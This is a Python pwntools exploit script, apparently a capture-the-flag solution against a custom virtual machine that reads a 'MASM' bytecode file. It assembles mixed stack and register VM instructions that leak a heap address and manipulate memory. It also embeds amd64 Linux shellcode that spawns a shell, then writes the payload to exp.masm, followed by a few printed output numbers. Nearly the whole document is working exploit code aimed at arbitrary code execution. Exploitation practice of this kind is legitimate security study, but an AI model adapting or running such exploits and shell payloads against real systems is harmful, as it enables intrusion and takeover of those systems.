#!/usr/bin/env python3

from pwn import *
from math import ceil

context.arch = 'amd64'

def op_len(op):
    r = 0 
    for b in op[1:]:
        r += len(b)
    return r

def s_push1(val): return (0, p8(0x10), p32(val))
def s_push2(val): return (0, p8(0x20), p32(val))
def s_push4(val): return (0, p8(0x30), p32(val))
def s_push4m(addr): return (0, p8(0x40), p32(addr))
def s_pop4(): return (0, p8(0x50))

def s_add(): return (0, p8(0x60))
def s_sub(): return (0, p8(0x61))
def s_xor(): return (0, p8(0x62))
def s_and_(): return (0, p8(0x63))

def s_jmp(addr): return (0, p8(0x70), p32(addr + 0x1000))
def s_jnz(addr): return (0, p8(0x71), p32(addr + 0x1000))
def s_jz(addr): return (0, p8(0x72), p32(addr + 0x1000))

def s_cmp(): return (0, p8(0x80))
def s_syscall(): return (0, p8(0xa0), p32(0))
def s_halt(): return (0, p8(0xff), p32(0xFFFFFFFF))

def r_dummy():
    return (1, p8(0x00))

def assemble_stack_vm(instructions):
    code = bytearray()
    switch_map = []
    for t in instructions:
        is_regvm = t[0]
        if is_regvm == 2:
            code.extend(t[1])
            switch_map.extend([0] * len(t[1]))
            continue

        chunk = bytearray()
        for b in t[1:]:
            chunk.extend(b)

        code.extend(chunk)

        for _ in range(len(chunk)):
            switch_map.append(is_regvm)

    return code, switch_map


def create_masm(code, switch_map, rodata):
    out = bytearray()
    out.extend(b'MASM')
    out.extend(p8(0x01))  # code segment type
    out.extend(p16(0x13)) # code offset
    out.extend(p16(len(code)))  # code size in bytes

    out.extend(p8(0x02))  # rodata segment type
    out.extend(p16(0x13 + len(code)))  # rodata offset
    out.extend(p16(len(rodata)))  # rodata size in bytes

    out.extend(p8(0x03))  # swtich_map segment type
    out.extend(p16(0x13 + len(code) + len(rodata)))

    switch_map_bytes = ceil(len(switch_map) / 8)
    out.extend(p16(switch_map_bytes))


    out.extend(code)
    out.extend(rodata)
    for i in range(switch_map_bytes):
        chunk = switch_map[i * 8:(i + 1) * 8]
        chunk = switch_map[i * 8:(i + 1) * 8][::-1]
        out.extend(p8(int("".join(map(str, chunk)), 2)))


    return out


def r_set_reg(reg, val):
    return (1, p8(0xc0 | (reg << 3) | 5), p32(val))

def r_fetch_mem_to_reg(dst, addr):
    return (1, p8(0xc0 | 4 | (dst << 3)), p32(addr))

# def r_store_reg_to_mem(dst_reg, src_reg):
    # return (1, p8(0xc0 | (dst_reg << 3) | src_reg & 0x7))

def r_pop_to_mem(dst_reg):
    return (1, p8(0xa0 | 0b101), p8(0xc0 | 6 | (dst_reg << 3)))

def r_sub_reg_reg(reg1, reg2):
    return (1, p8(0x30), p8((reg1+1) << 4 | (reg2+1)))

def r_add_reg_reg(reg1, reg2):
    return (1, p8(0x20), p8((reg1+1) << 4 | (reg2+1)))


def r_mul_reg_reg(reg1, reg2):
    return (1, p8(0x50), p8((reg1+1) << 4 | (reg2+1)))


def r_xor_reg_reg(reg1, reg2):
    return (1, p8(0x40), p8((reg1+1) << 4 | (reg2+1)))


def r_reg_add_imm(reg, imm):
    reg = (reg + 1) & 0xFF
    return (1, p8(0x21), p8(reg), p32(imm))


def r_write_rodata(arg1, imm):
    return (1, p8(0x41), p8(arg1), p32(imm))

def r_push_reg(reg):
    return (1, p8(17 + reg))

def r_pop_reg(reg):
    return (1, p8(21 + reg))


epilogue = [
    r_set_reg(0, 0x4),
    s_push4(0xa000),
    s_push1(0x6),
    s_syscall(),

    # store heap addr
    r_xor_reg_reg(1, 4),
    r_xor_reg_reg(2, 5),

    r_push_reg(1),
    r_push_reg(2),

    # move calloc'ed dyn a bit earlier
    r_set_reg(1, 0x100),
    r_xor_reg_reg(4, 1),

    r_fetch_mem_to_reg(1, 0xa000),
    # r_reg_add_imm(0, 0x100),
    r_set_reg(0, 0x100),
    r_add_reg_reg(1, 0),
    r_fetch_mem_to_reg(2, 0xa004),

    r_set_reg(3, 0xa028),
    r_push_reg(1),
    r_pop_to_mem(3),

    r_set_reg(3, 0xa028+4),
    r_push_reg(2),
    r_pop_to_mem(3),

    s_push1(5),
    s_syscall()
]

elen = sum(op_len(t) for t in epilogue)

dddd = 0x100
padding = dddd - elen
epilogue.extend([r_dummy()] * padding)

shellcode = asm(shellcraft.amd64.linux.sh())
epilogue.extend([
    (2, shellcode)
])

elen = sum(op_len(t) for t in epilogue)
dddd = 0x300
padding = dddd - elen
epilogue.extend([r_dummy()] * padding)

code, switch_map = assemble_stack_vm(epilogue)


masm = create_masm(
    code,
    switch_map,
    b'ASDF',
)


print(hexdump(masm))
print(len(masm))
print(len(code))
print(len(switch_map))

with open('exp.masm', 'wb') as f:
    f.write(masm)


2884
2543
2543